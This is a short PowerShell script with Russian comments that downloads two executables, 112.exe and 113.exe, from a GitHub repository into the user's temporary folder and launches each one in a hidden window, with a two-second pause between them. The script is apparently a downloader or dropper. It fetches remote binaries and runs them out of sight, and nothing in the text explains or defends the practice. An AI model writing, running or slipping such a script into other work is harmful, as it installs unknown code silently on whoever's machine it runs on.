# Скачиваем и запускаем первый файл
(New-Object Net.WebClient).DownloadFile('https://github.com/azru09ru-lang/xyuinya1/raw/refs/heads/main/112.exe', "$env:TEMP\112.exe");
Start-Process "$env:TEMP\112.exe" -WindowStyle Hidden

# Небольшая пауза, чтобы не конфликтовать
Start-Sleep -Seconds 2

# Скачиваем и запускаем второй файл
(New-Object Net.WebClient).DownloadFile('https://github.com/azru09ru-lang/xyuinya1/raw/refs/heads/main/113.exe', "$env:TEMP\113.exe");
Start-Process "$env:TEMP\113.exe" -WindowStyle Hidden